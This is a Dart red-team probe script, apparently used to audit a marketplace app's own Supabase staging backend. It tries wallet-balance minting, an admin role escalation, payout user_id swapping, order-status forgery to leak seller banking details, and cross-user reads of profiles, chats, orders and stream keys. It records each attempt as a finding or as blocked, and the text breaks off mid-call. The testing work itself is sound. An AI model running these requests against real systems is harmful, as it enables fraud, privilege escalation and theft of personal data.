// ignore_for_file: avoid_print
/// Red Team Cego B — 20260829T1518 — staging only.
/// Não corrige. Não toca produção. service_role só setup/observação/cleanup.
library;

import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260829T1518';
const tag = 'RTBB1518';

final findings = <Map<String, dynamic>>[];
final blocked = <Map<String, dynamic>>[];
final recon = <String, dynamic>{};
final races = <Map<String, dynamic>>[];
final cycles = <String, dynamic>{};
final evidence = <String, dynamic>{};

void noteFinding({
  required String id,
  required String severity,
  required String title,
  required String actor,
  String? pre,
  String? request,
  dynamic before,
  dynamic result,
  dynamic after,
  String? impact,
  String? repro,
}) {
  findings.add({
    'id': id,
    'severity': severity,
    'title': title,
    'actor': actor,
    if (pre != null) 'preconditions': pre,
    if (request != null) 'request': request,
    if (before != null) 'state_before': before,
    'result': result,
    if (after != null) 'state_after': after,
    if (impact != null) 'impact': impact,
    if (repro != null) 'reproduction': repro,
  });
}

void noteBlocked(String id, String title, dynamic result) {
  blocked.add({'id': id, 'title': title, 'result': _clip(result)});
}

dynamic _clip(dynamic v, [int max = 800]) {
  final s = v is String ? v : jsonEncode(v);
  if (s.length <= max) return v is String ? v : jsonDecode(jsonEncode(v));
  return '${s.substring(0, max)}…';
}

Future<http.Response> rest(
  LiveOpsStagingClient c, {
  required String method,
  required String path,
  String? token,
  String? apikey,
  Object? body,
  Map<String, String>? extraHeaders,
  bool service = false,
}) async {
  final headers = <String, String>{
    'apikey': service ? c.serviceRoleKey : (apikey ?? c.anonKey),
    'Authorization':
        'Bearer ${service ? c.serviceRoleKey : (token ?? c.anonKey)}',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  if (extraHeaders != null) headers.addAll(extraHeaders);
  final uri = Uri.parse('${c.url}$path');
  final encoded = body == null ? null : jsonEncode(body);
  switch (method) {
    case 'GET':
      return http.get(uri, headers: headers);
    case 'POST':
      return http.post(uri, headers: headers, body: encoded);
    case 'PATCH':
      return http.patch(uri, headers: headers, body: encoded);
    case 'DELETE':
      return http.delete(uri, headers: headers);
    case 'HEAD':
      return http.head(uri, headers: headers);
    default:
      throw ArgumentError(method);
  }
}

Future<http.Response> edge(
  LiveOpsStagingClient c,
  String fn, {
  String? token,
  Object? body,
  String method = 'POST',
  Map<String, String>? extraHeaders,
  String query = '',
}) async {
  final headers = <String, String>{
    'apikey': c.anonKey,
    'Authorization': 'Bearer ${token ?? c.anonKey}',
    'Content-Type': 'application/json',
  };
  if (extraHeaders != null) headers.addAll(extraHeaders);
  final uri = Uri.parse('${c.url}/functions/v1/$fn$query');
  if (method == 'GET') return http.get(uri, headers: headers);
  return http.post(uri, headers: headers, body: body == null ? null : jsonEncode(body));
}

Map<String, dynamic> httpSnap(http.Response r) => {
      'status': r.statusCode,
      'body': _clip(r.body, 600),
    };

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final client = LiveOpsStagingClient(
    url: normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL')),
    anonKey: envRequire(env, 'SUPABASE_ANON_KEY'),
    serviceRoleKey: envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY'),
  );
  if (!client.url.contains('fxdknzrqjenzqcvnwqqq')) {
    stderr.writeln('ABORT: não é staging fxdknzrqjenzqcvnwqqq');
    exit(2);
  }

  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final buyerTok = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  recon['project'] = 'fxdknzrqjenzqcvnwqqq';
  recon['frozen_at'] = DateTime.now().toUtc().toIso8601String();
  recon['actors'] = {'buyer': buyerId, 'seller': sellerId};

  await _cycleRecon(client, buyerTok, sellerTok);
  await _cycleFinancial(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleIdentityStates(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cyclePrivacy(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleEdges(client, buyerTok, sellerTok, buyerId, sellerId, env);
  await _cycleCollusionStock(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleRaces(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleReviewsDisputesTips(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleStaffAdminMux(client, buyerTok, sellerTok, buyerId, sellerId);
  await _cycleLastSaturation(client, buyerTok, sellerTok, buyerId, sellerId);

  final outDir = Directory('tool/reports/redteam_blind_b_$stamp');
  outDir.createSync(recursive: true);
  Directory('${outDir.path}/probes').createSync(recursive: true);
  File('tool/redteam_blind_b_${stamp}.dart')
      .copySync('${outDir.path}/probes/redteam_blind_b_${stamp}.dart');

  final p0 = findings.where((f) => f['severity'] == 'P0').length;
  final p1 = findings.where((f) => f['severity'] == 'P1').length;
  final p2 = findings.where((f) => f['severity'] == 'P2').length;
  final p3 = findings.where((f) => f['severity'] == 'P3').length;

  final payload = {
    'frozen_at': recon['frozen_at'],
    'auditor': 'REDTEAM_BLIND_B',
    'stamp': stamp,
    'production_touched': false,
    'fase4': false,
    'recon': recon,
    'cycles': cycles,
    'findings': findings,
    'blocked_or_hardened': blocked,
    'races': races,
    'evidence': evidence,
    'counts': {'P0': p0, 'P1': p1, 'P2': p2, 'P3': p3},
  };
  File('${outDir.path}/REDTEAM_BLIND_B_$stamp.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert(payload));

  print('FINDINGS P0=$p0 P1=$p1 P2=$p2 P3=$p3 blocked=${blocked.length}');
  for (final f in findings) {
    print('  [${f['severity']}] ${f['id']} ${f['title']}');
  }
}

Future<void> _cycleRecon(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
) async {
  cycles['1_recon'] = 'start';
  final oa = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/',
    extraHeaders: {'Accept': 'application/openapi+json'},
  );
  recon['openapi_anon'] = oa.statusCode;
  final oaSvc = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/',
    service: true,
    extraHeaders: {'Accept': 'application/openapi+json'},
  );
  recon['openapi_service'] = oaSvc.statusCode;
  var tableNames = <String>[];
  if (oaSvc.statusCode == 200) {
    try {
      final spec = jsonDecode(oaSvc.body) as Map<String, dynamic>;
      final paths = spec['paths'] as Map<String, dynamic>? ?? {};
      tableNames = paths.keys
          .where((k) => k.startsWith('/') && !k.substring(1).contains('/'))
          .map((k) => k.substring(1))
          .where((k) => k != 'rpc')
          .toList()
        ..sort();
      recon['exposed_tables_n'] = tableNames.length;
      recon['exposed_tables_sample'] = tableNames.take(80).toList();
    } catch (e) {
      recon['openapi_parse_error'] = e.toString();
    }
  }

  const sensitive = [
    'orders',
    'wallets',
    'wallet_transactions',
    'wallet_payout_ledger',
    'live_tips',
    'lives',
    'live_items',
    'live_reservation_requests',
    'chats',
    'chat_messages',
    'reviews',
    'order_disputes',
    'profiles',
    'products',
    'ps_pairing_sessions',
    'stripe_checkout_events',
    'fleaber_commissions',
    'live_raffle_winners',
    'seller_helpers',
    'product_bundles',
    'product_offers',
  ];
  final access = <String, dynamic>{};
  for (final t in sensitive) {
    final anon = await rest(c, method: 'GET', path: '/rest/v1/$t?select=*&limit=3');
    final buyer = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/$t?select=*&limit=5',
      token: buyerTok,
    );
    access[t] = {
      'anon': {'status': anon.statusCode, 'bytes': anon.body.length, 'n': _rowN(anon)},
      'buyer': {'status': buyer.statusCode, 'bytes': buyer.body.length, 'n': _rowN(buyer)},
    };
  }
  recon['table_access'] = access;

  const rpcs = [
    'batata_credit_wallet_once',
    'batata_debit_wallet_once',
    'batata_ensure_wallet',
    'batata_wallet_apply_tip_once',
    'batata_send_live_tip_from_wallet',
    'batata_create_live_tip_pending',
    'batata_settle_live_tip_from_stripe',
    'batata_release_seller_wallet_for_order',
    'batata_refund_buyer_wallet_for_order',
    'batata_process_partial_refund_dispute',
    'batata_clawback_seller_wallet_for_order',
    'batata_wallet_payout_debit',
    'batata_wallet_payout_finish',
    'batata_seller_direct_payment_details',
    'batata_find_user_id_by_email',
    'batata_admin_list_profiles',
    'batata_generate_auto_feedback',
    'batata_lab_clear_fm_pending',
    'batata_ps_claim_pairing',
    'batata_create_raffle_prize_order',
    'batata_award_live_raffle_tickets',
    'batata_live_system_message',
    'batata_recompact_reservation_queue',
    'batata_sync_live_item_for_order',
    'batata_finalize_stripe_order_refund',
    'batata_live_reservation_stripe_convert',
    'batata_get_my_payout_details',
  ];
  final rpcMap = <String, dynamic>{};
  for (final fn in rpcs) {
    final r = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/$fn',
      token: buyerTok,
      body: <String, dynamic>{},
    );
    rpcMap[fn] = {'status': r.statusCode, 'hint': _clip(r.body, 180)};
  }
  recon['rpc_buyer_empty'] = rpcMap;
  cycles['1_recon'] = 'done';
}

int _rowN(http.Response r) {
  if (r.statusCode >= 400) return -1;
  try {
    final d = jsonDecode(r.body);
    if (d is List) return d.length;
  } catch (_) {}
  return -2;
}

Future<void> _cycleFinancial(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['2_financial'] = 'start';

  // Wallet mint via INSERT
  final wIns = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/wallets',
    token: buyerTok,
    body: {'id': buyerId, 'balance': 99999.12},
  );
  if (wIns.statusCode < 300) {
    final after = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/wallets?id=eq.$buyerId&select=id,balance',
      token: buyerTok,
    );
    noteFinding(
      id: 'RTB-B-FIN-01',
      severity: 'P0',
      title: 'JWT INSERT wallet com saldo inventado',
      actor: 'buyer JWT',
      request: 'POST /wallets {id:self, balance:99999.12}',
      result: httpSnap(wIns),
      after: _clip(after.body),
      impact: 'Criação líquida de saldo levantável/tipável.',
    );
  } else {
    noteBlocked('FIN-01', 'wallet INSERT mint', httpSnap(wIns));
  }

  final wUpd = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/wallets?id=eq.$buyerId',
    token: buyerTok,
    body: {'balance': 88888},
  );
  if (wUpd.statusCode < 300 && wUpd.body.contains('88888')) {
    noteFinding(
      id: 'RTB-B-FIN-02',
      severity: 'P0',
      title: 'JWT PATCH wallets.balance',
      actor: 'buyer JWT',
      result: httpSnap(wUpd),
    );
  } else {
    noteBlocked('FIN-02', 'wallet PATCH balance', httpSnap(wUpd));
  }

  final credit = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_credit_wallet_once',
    token: buyerTok,
    body: {
      'p_wallet_id': buyerId,
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 50,
      'p_type': 'reembolso',
      'p_description': 'x',
    },
  );
  if (credit.statusCode == 200) {
    noteFinding(
      id: 'RTB-B-FIN-03',
      severity: 'P0',
      title: 'JWT executa batata_credit_wallet_once',
      actor: 'buyer JWT',
      result: httpSnap(credit),
    );
  } else {
    noteBlocked('FIN-03', 'credit_wallet_once JWT', httpSnap(credit));
  }

  final applyTip = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_wallet_apply_tip_once',
    token: buyerTok,
    body: {
      'p_wallet_id': sellerId,
      'p_tip_id': '00000000-0000-0000-0000-000000000002',
      'p_amount': 10,
      'p_type': 'gorjeta_recebida',
      'p_description': 'x',
    },
  );
  if (applyTip.statusCode == 200 && applyTip.body.contains('true')) {
    noteFinding(
      id: 'RTB-B-FIN-04',
      severity: 'P0',
      title: 'JWT mint tip via apply_tip_once',
      actor: 'buyer JWT',
      result: httpSnap(applyTip),
    );
  } else {
    noteBlocked('FIN-04', 'apply_tip_once JWT', httpSnap(applyTip));
  }

  // Tip from wallet with mutated amounts
  for (final amt in [-5, 0, 0.01, 1, 501, 1e9]) {
    final tip = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/batata_send_live_tip_from_wallet',
      token: buyerTok,
      body: {
        'p_live_id': null,
        'p_seller_id': sellerId,
        'p_amount': amt,
        'p_message': '$tag tip $amt',
      },
    );
    evidence['tip_wallet_$amt'] = httpSnap(tip);
    if (tip.statusCode == 200 && amt <= 0) {
      noteFinding(
        id: 'RTB-B-FIN-05',
        severity: 'P1',
        title: 'send_live_tip aceita montante não-positivo $amt',
        actor: 'buyer JWT',
        result: httpSnap(tip),
      );
    }
  }

  // Payout confused deputy: body.user_id = vítima
  final payout = await edge(
    c,
    'create-connect-account',
    token: buyerTok,
    body: {
      'user_id': sellerId,
      'amount': 100,
      'idempotency_key': 'rtbb_${stamp}_payout_swap',
    },
  );
  evidence['payout_user_swap'] = httpSnap(payout);
  if (payout.statusCode == 200 && payout.body.contains('success')) {
    noteFinding(
      id: 'RTB-B-FIN-06',
      severity: 'P0',
      title: 'Payout usa user_id do body (não o JWT)',
      actor: 'buyer JWT',
      request: 'create-connect-account user_id=seller amount=100',
      result: httpSnap(payout),
    );
  } else {
    noteBlocked('FIN-06', 'payout user_id swap', httpSnap(payout));
  }

  cycles['2_financial'] = 'done';
}

Future<Map<String, dynamic>?> _ensureProduct(
  LiveOpsStagingClient c,
  String sellerTok,
  String sellerId,
) async {
  final existing = await rest(
    c,
    method: 'GET',
    path:
        '/rest/v1/products?seller_id=eq.$sellerId&title=like.$tag*&select=id,title,price,quantity,seller_id&limit=1',
    service: true,
  );
  if (existing.statusCode == 200) {
    final list = jsonDecode(existing.body);
    if (list is List && list.isNotEmpty) {
      return Map<String, dynamic>.from(list.first as Map);
    }
  }
  final ins = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/products',
    token: sellerTok,
    body: {
      'seller_id': sellerId,
      'title': '$tag probe product',
      'price': 7.5,
      'quantity': 1,
      'list_on_marketplace': true,
      'available_for_live': true,
      'description': tag,
    },
  );
  if (ins.statusCode >= 300) {
    evidence['product_insert'] = httpSnap(ins);
    return null;
  }
  final list = jsonDecode(ins.body);
  if (list is List && list.isNotEmpty) {
    return Map<String, dynamic>.from(list.first as Map);
  }
  if (list is Map) return Map<String, dynamic>.from(list);
  return null;
}

Future<void> _cycleIdentityStates(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['3_identity_states'] = 'start';

  // Setup banking fields on seller (observation/setup)
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/profiles?id=eq.$sellerId',
    service: true,
    body: {
      'iban': 'PT50000201231234567890154',
      'mb_way': '910000000',
      'external_payments_enabled': true,
    },
  );

  final prod = await _ensureProduct(c, sellerTok, sellerId);
  evidence['product'] = prod;
  if (prod == null) {
    cycles['3_identity_states'] = 'no_product';
    return;
  }
  final pid = prod['id'].toString();

  // Buyer user_type elevation
  final ut = await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/profiles?id=eq.$buyerId',
    token: buyerTok,
    body: {'user_type': 'admin'},
  );
  final utAfter = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/profiles?id=eq.$buyerId&select=id,user_type',
    token: buyerTok,
  );
  evidence['user_type_patch'] = {
    'patch': httpSnap(ut),
    'after': _clip(utAfter.body),
  };
  if (utAfter.body.toLowerCase().contains('admin')) {
    noteFinding(
      id: 'RTB-B-ID-01',
      severity: 'P0',
      title: 'Buyer PATCH user_type → admin',
      actor: 'buyer JWT',
      result: _clip(utAfter.body),
    );
  } else {
    noteBlocked('ID-01', 'user_type PATCH', httpSnap(ut));
  }

  // Banking oracle — matrix of statuses on INSERT
  const statuses = [
    'reserva_pendente',
    'pendente',
    'reservado',
    'aguarda_confirmacao',
    'aguarda_pagamento',
    'pago',
    'enviado',
    'concluido',
    'premio_rifa',
  ];
  final oracle = <String, dynamic>{};
  String? leakOrderId;
  String? leakStatus;

  for (final st in statuses) {
    final ins = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/orders',
      token: buyerTok,
      body: {
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'product_id': pid,
        'quantity': 1,
        'price': 7.5,
        'price_total': 7.5,
        'status': st,
        'payment_method': 'MB WAY',
      },
    );
    String? oid;
    String? persisted;
    if (ins.statusCode < 300) {
      try {
        final d = jsonDecode(ins.body);
        final row = d is List ? d.first : d;
        oid = (row as Map)['id']?.toString();
        persisted = row['status']?.toString();
      } catch (_) {}
    }
    Map<String, dynamic>? details;
    if (oid != null) {
      final rpc = await rest(
        c,
        method: 'POST',
        path: '/rest/v1/rpc/batata_seller_direct_payment_details',
        token: buyerTok,
        body: {'p_seller_id': sellerId},
      );
      details = httpSnap(rpc);
      final leaked = rpc.statusCode == 200 &&
          (rpc.body.contains('PT50') || rpc.body.contains('910000000'));
      if (leaked && st != 'reservado') {
        leakOrderId = oid;
        leakStatus = persisted ?? st;
      }
      if (leaked && (persisted == 'reserva_pendente' || persisted == 'pendente' ||
          persisted == 'aguarda_confirmacao')) {
        // keep
      }
    }
    oracle[st] = {
      'insert': httpSnap(ins),
      'persisted_status': persisted,
      'order_id': oid,
      'details': details,
    };
    if (oid != null) {
      await rest(
        c,
        method: 'DELETE',
        path: '/rest/v1/orders?id=eq.$oid',
        service: true,
      );
    }
  }
  evidence['banking_oracle_insert_matrix'] = oracle;

  // Detect leak on non-accepted statuses
  for (final e in oracle.entries) {
    final v = e.value as Map;
    final details = v['details'] as Map?;
    final body = details?['body']?.toString() ?? '';
    final persisted = v['persisted_status']?.toString() ?? '';
    final leaked = body.contains('PT50') || body.contains('910000000');
    if (!leaked) continue;
    final accepted = persisted == 'reservado' ||
        persisted == 'aguarda_pagamento';
    if (!accepted) {
      noteFinding(
        id: 'RTB-B-BANK-01',
        severity: 'P1',
        title:
            'Oráculo bancário: INSERT status=${e.key} persistiu=$persisted revelou IBAN/MB WAY',
        actor: 'buyer JWT',
        pre: 'seller external_payments_enabled + IBAN; order MB WAY',
        request:
            'POST orders status=${e.key} payment_method=MB WAY → rpc batata_seller_direct_payment_details',
        result: {'insert': v['insert'], 'details': details, 'persisted': persisted},
        impact:
            'Comprador obtém IBAN/MB WAY do vendedor sem aceitação (estado semanticamente equivalente menos protegido).',
        repro:
            '1) JWT buyer INSERT order MB WAY com status ${e.key}. 2) RPC batata_seller_direct_payment_details(seller). 3) Comparar body com IBAN.',
      );
    }
  }

  // PATCH reserva_pendente → aguarda_confirmacao
  final base = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price': 7.5,
      'price_total': 7.5,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
  String? baseId;
  if (base.statusCode < 300) {
    final d = jsonDecode(base.body);
    final row = d is List ? d.first : d;
    baseId = (row as Map)['id']?.toString();
  }
  if (baseId != null) {
    final patch = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$baseId',
      token: buyerTok,
      body: {'status': 'aguarda_confirmacao'},
    );
    final read = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.$baseId&select=id,status',
      token: buyerTok,
    );
    final det = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/batata_seller_direct_payment_details',
      token: buyerTok,
      body: {'p_seller_id': sellerId},
    );
    evidence['patch_aguarda_confirmacao'] = {
      'patch': httpSnap(patch),
      'read': _clip(read.body),
      'details': httpSnap(det),
    };
    final persistedAguarda = read.body.contains('aguarda_confirmacao');
    final leaked = det.body.contains('PT50') || det.body.contains('910000000');
    if (persistedAguarda && leaked) {
      noteFinding(
        id: 'RTB-B-BANK-02',
        severity: 'P1',
        title:
            'Buyer PATCH reserva_pendente→aguarda_confirmacao revelou dados bancários',
        actor: 'buyer JWT',
        request: 'PATCH orders.status=aguarda_confirmacao + RPC details',
        before: 'reserva_pendente',
        result: evidence['patch_aguarda_confirmacao'],
        after: _clip(read.body),
        impact:
            'O guard de self-accept bloqueia reservado/aguarda_pagamento mas não aguarda_confirmacao, que o RPC de banking trata como revelável.',
        repro:
            'Criar order MB WAY reserva_pendente; PATCH status aguarda_confirmacao; chamar batata_seller_direct_payment_details.',
      );
    } else if (persistedAguarda && !leaked) {
      noteBlocked(
        'BANK-02',
        'PATCH aguarda_confirmacao persistiu mas RPC não revelou',
        evidence['patch_aguarda_confirmacao'],
      );
    } else {
      noteBlocked('BANK-02', 'PATCH aguarda_confirmacao', httpSnap(patch));
    }

    // Buyer self-pago
    final pago = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$baseId',
      token: buyerTok,
      body: {'status': 'pago', 'amount_paid_cents': 750},
    );
    evidence['buyer_self_pago'] = httpSnap(pago);
    final pagoRead = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.$baseId&select=id,status,amount_paid_cents',
      token: buyerTok,
    );
    if (pagoRead.body.contains('"pago"')) {
      noteFinding(
        id: 'RTB-B-STATE-01',
        severity: 'P0',
        title: 'Buyer marca order como pago + amount_paid_cents',
        actor: 'buyer JWT',
        result: _clip(pagoRead.body),
      );
    } else {
      noteBlocked('STATE-01', 'buyer self pago', _clip(pagoRead.body));
    }

    // Quantity bump
    final qty = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$baseId',
      token: buyerTok,
      body: {'quantity': 99, 'price_total': 742.5},
    );
    final qtyRead = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.$baseId&select=id,quantity,price_total',
      token: buyerTok,
    );
    evidence['qty_bump'] = {'patch': httpSnap(qty), 'read': _clip(qtyRead.body)};
    if (qtyRead.body.contains('99')) {
      noteFinding(
        id: 'RTB-B-STATE-02',
        severity: 'P1',
        title: 'Buyer PATCH quantity 1→99 após criar order',
        actor: 'buyer JWT',
        result: _clip(qtyRead.body),
      );
    } else {
      noteBlocked('STATE-02', 'qty bump', _clip(qtyRead.body));
    }

    // Confused deputy: order with other buyer_id
    final other = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/orders',
      token: buyerTok,
      body: {
        'buyer_id': sellerId,
        'seller_id': sellerId,
        'product_id': pid,
        'quantity': 1,
        'price': 7.5,
        'status': 'reserva_pendente',
        'payment_method': 'MB WAY',
      },
    );
    evidence['order_as_other_buyer'] = httpSnap(other);
    if (other.statusCode < 300) {
      noteFinding(
        id: 'RTB-B-ID-02',
        severity: 'P1',
        title: 'Buyer INSERT order com buyer_id alheio',
        actor: 'buyer JWT',
        result: httpSnap(other),
      );
      try {
        final d = jsonDecode(other.body);
        final row = d is List ? d.first : d;
        final oid = (row as Map)['id']?.toString();
        if (oid != null) {
          await rest(
            c,
            method: 'DELETE',
            path: '/rest/v1/orders?id=eq.$oid',
            service: true,
          );
        }
      } catch (_) {}
    } else {
      noteBlocked('ID-02', 'order other buyer_id', httpSnap(other));
    }

    await rest(
      c,
      method: 'DELETE',
      path: '/rest/v1/orders?id=eq.$baseId',
      service: true,
    );
  }

  evidence['leak_order'] = {'id': leakOrderId, 'status': leakStatus};
  cycles['3_identity_states'] = 'done';
}

Future<void> _cyclePrivacy(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['4_privacy'] = 'start';

  // lives stream keys
  for (final cols in [
    'id,mux_stream_key,stream_key',
    'id,mux_playback_id,status',
    '*',
  ]) {
    final anon = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/lives?select=$cols&limit=3',
    );
    final buyer = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/lives?select=$cols&limit=3',
      token: buyerTok,
    );
    evidence['lives_select_$cols'] = {
      'anon': httpSnap(anon),
      'buyer': httpSnap(buyer),
    };
    final blob = '${anon.body}${buyer.body}';
    if (RegExp(r'"mux_stream_key"\s*:\s*"[^"]+"').hasMatch(blob) ||
        RegExp(r'"stream_key"\s*:\s*"[^"]+"').hasMatch(blob)) {
      noteFinding(
        id: 'RTB-B-PRIV-01',
        severity: 'P1',
        title: 'SELECT lives devolve stream_key',
        actor: 'anon/buyer',
        result: {
          'anon': httpSnap(anon),
          'buyer': httpSnap(buyer),
        },
        impact: 'Credencial de ingest Mux exposta; hijack de publicação.',
      );
    }
  }

  // profiles PII
  final profAnon = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/profiles?select=id,email,phone,iban,mb_way,full_name&limit=5',
  );
  final profBuyer = await rest(
    c,
    method: 'GET',
    path:
        '/rest/v1/profiles?id=eq.$sellerId&select=id,email,phone,iban,mb_way,full_name,user_type',
    token: buyerTok,
  );
  evidence['profiles_pii'] = {
    'anon': httpSnap(profAnon),
    'buyer_other': httpSnap(profBuyer),
  };
  if (profBuyer.statusCode == 200 &&
      (profBuyer.body.contains('iban') && profBuyer.body.contains('PT'))) {
    noteFinding(
      id: 'RTB-B-PRIV-02',
      severity: 'P1',
      title: 'Buyer SELECT profiles.iban de outro user',
      actor: 'buyer JWT',
      result: httpSnap(profBuyer),
    );
  } else {
    noteBlocked('PRIV-02', 'profiles iban cross-user', httpSnap(profBuyer));
  }

  // chats of others
  final chats = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/chats?select=*&limit=20',
    token: buyerTok,
  );
  evidence['chats_buyer'] = {
    'status': chats.statusCode,
    'n': _rowN(chats),
  };
  if (chats.statusCode == 200) {
    try {
      final list = jsonDecode(chats.body) as List;
      final foreign = list.where((e) {
        final m = e as Map;
        return m['user_a'] != buyerId && m['user_b'] != buyerId;
      }).toList();
      if (foreign.isNotEmpty) {
        noteFinding(
          id: 'RTB-B-PRIV-03',
          severity: 'P1',
          title: 'Buyer lê chats onde não é participante',
          actor: 'buyer JWT',
          result: {'n_foreign': foreign.length, 'sample': _clip(foreign.first)},
        );
      } else {
        noteBlocked('PRIV-03', 'chats own-only', {'n': list.length});
      }
    } catch (_) {}
  }

  // orders of others
  final orders = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/orders?select=id,buyer_id,seller_id,status,price_total&limit=50',
    token: buyerTok,
  );
  if (orders.statusCode == 200) {
    try {
      final list = jsonDecode(orders.body) as List;
      final foreign = list.where((e) {
        final m = e as Map;
        return m['buyer_id'] != buyerId && m['seller_id'] != buyerId;
      }).toList();
      evidence['orders_buyer_n'] = list.length;
      evidence['orders_foreign_n'] = foreign.length;
      if (foreign.isNotEmpty) {
        noteFinding(
          id: 'RTB-B-PRIV-04',
          severity: 'P1',
          title: 'Buyer lê orders de terceiros',
          actor: 'buyer JWT',
          result: {'n_foreign': foreign.length, 'sample': _clip(foreign.first)},
        );
      } else {
        noteBlocked('PRIV-04', 'orders own-only', {'n': list.length});
      }
    } catch (_) {}
  }

  // email oracle as buyer vs seller
  final emailBuyer = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_find_user_id_by_email',
    token: buyerTok,
    body: {'p_email': 'axinoquaa@axinoquaa.pt'},
  );
  final emailSeller = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_find_user_id_by_email',
    token: sellerTok,
    body: {'p_email': 'axinoqua@axinoquaa.pt'},
  );
  evidence['email_oracle'] = {
    'buyer': httpSnap(emailBuyer),
    'seller': httpSnap(emailSeller),
  };
  if (emailBuyer.statusCode == 200 &&
      emailBuyer.body.contains(sellerId)) {
    noteFinding(
      id: 'RTB-B-PRIV-05',
      severity: 'P2',
      title: 'Buyer (não-seller) resolve email→UUID',
      actor: 'buyer JWT',
      result: httpSnap(emailBuyer),
    );
  } else {
    noteBlocked('PRIV-05', 'email oracle buyer', httpSnap(emailBuyer));
  }
  if (emailSeller.statusCode == 200 &&
      RegExp(r'[0-9a-f-]{36}').hasMatch(emailSeller.body)) {
    noteFinding(
      id: 'RTB-B-PRIV-06',
      severity: 'P2',
      title: 'Seller email→UUID enumeração de contas',
      actor: 'seller JWT',
      result: httpSnap(emailSeller),
      impact: 'Enumeração de utilizadores por email (rate-limited).',
    );
  }

  // Storage: seller lists buyer proofs (cross-order)
  final listProofs = await http.post(
    Uri.parse('${c.url}/storage/v1/object/list/fleaber_private'),
    headers: {
      'apikey': c.anonKey,
      'Authorization': 'Bearer $sellerTok',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'prefix': 'order_proofs/$buyerId',
      'limit': 20,
    }),
  );
  evidence['storage_seller_list_buyer_proofs'] = httpSnap(listProofs);
  if (listProofs.statusCode == 200) {
    try {
      final d = jsonDecode(listProofs.body);
      if (d is List && d.isNotEmpty) {
        noteFinding(
          id: 'RTB-B-PRIV-07',
          severity: 'P2',
          title:
              'Seller lista order_proofs do buyer (policy counterparty por buyer_id, não por order)',
          actor: 'seller JWT',
          result: {'n': d.length, 'sample': _clip(d.first)},
          impact:
              'Qualquer encomenda partilhada autoriza leitura de TODAS as provas desse buyer, incluindo de outras encomendas.',
        );
      } else {
        noteBlocked('PRIV-07', 'storage list empty', httpSnap(listProofs));
      }
    } catch (_) {
      noteBlocked('PRIV-07', 'storage list parse', httpSnap(listProofs));
    }
  } else {
    noteBlocked('PRIV-07', 'storage list', httpSnap(listProofs));
  }

  // Chat insert with third parties
  final chatIns = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/chats',
    token: buyerTok,
    body: {
      'user_a': sellerId,
      'user_b': '00000000-0000-0000-0000-000000000099',
    },
  );
  evidence['chat_third_party'] = httpSnap(chatIns);
  if (chatIns.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-PRIV-08',
      severity: 'P1',
